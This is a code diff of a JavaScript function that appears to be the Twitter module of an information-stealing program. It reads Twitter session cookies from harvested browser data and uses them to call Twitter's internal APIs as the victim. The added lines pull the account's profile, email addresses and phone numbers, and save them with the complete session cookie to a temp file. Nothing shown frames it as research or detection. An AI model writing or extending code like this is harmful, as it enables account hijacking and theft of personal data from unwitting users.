@@ -10,7 +10,7 @@ const twitter = async () => {
   if (!cookies && !cookies?.find(cookie => cookie.host?.includes('.twitter.com') && cookie.name === 'ct0')) return;
   const { value: ct0 } = cookies.find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'ct0');
   const { value: authToken, source } = cookies.find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'auth_token');
-  const { data: profile } = await axios.post('https://twitter.com/i/api/1.1/account/update_profile.json', {}, {
+  const config = {
     headers: {
       Cookie: `ct0=${ct0}; auth_token=${authToken}`,
       Host: 'twitter.com',
@@ -31,8 +31,27 @@ const twitter = async () => {
       'Sec-Fetch-Mode': 'cors',
       'Sec-Fetch-Site': 'same-site'
     }
-  });
-  profile.cookie = ct0;
+  };
+  const { data: profile } = await axios.post('https://twitter.com/i/api/1.1/account/update_profile.json', {}, config);
+  const params = new URLSearchParams();
+  params.set('variables', JSON.stringify({ screen_name: profile.screen_name, withSafetyModeUserFields: true }));
+  params.set('features', JSON.stringify({
+    hidden_profile_likes_enabled: false, hidden_profile_subscriptions_enabled: true,
+    responsive_web_graphql_exclude_directive_enabled: true, verified_phone_label_enabled: false,
+    subscriptions_verification_info_is_identity_verified_enabled: false,
+    subscriptions_verification_info_verified_since_enabled: true, highlights_tweets_tab_ui_enabled: true,
+    creator_subscriptions_tweet_preview_api_enabled: true,
+    responsive_web_graphql_skip_user_profile_image_extensions_enabled: false,
+    responsive_web_graphql_timeline_navigation_enabled: true
+  }));
+  const { data: user } = await axios.get(
+    `https://twitter.com/i/api/graphql/SAMkL5y_N9pmahSw8yy6gw/UserByScreenName?${params.toString()}`, config
+  );
+  const { data: email } = await axios.get('https://twitter.com/i/api/1.1/users/email_phone_info.json', config);
+  profile.emails = email.emails;
+  profile.phones = email.phone_numbers;
+  profile.user = user.data.user.result;
+  profile.cookie = `ct0=${ct0}; auth_token=${authToken}`;
   profile.source = source;
   writeFileSync(join(getTempFolder(), 'Twitter.json'), JSON.stringify(profile));
 };
